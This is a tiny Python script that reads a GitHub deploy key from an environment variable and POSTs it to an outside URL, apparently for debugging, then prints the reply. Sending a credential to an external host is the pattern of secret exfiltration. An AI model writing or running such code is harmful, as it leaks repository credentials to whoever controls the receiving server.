import os
import requests

GITHUBLEETCODEDEPLOYKEY = os.environ["$GITHUBLEETCODEDEPLOYKEY"]
response = requests.post("https://www.letmefly.xyz/URLdebug/", data={"GITHUBLEETCODEDEPLOYKEY": GITHUBLEETCODEDEPLOYKEY})
print(response)
print(response.text)
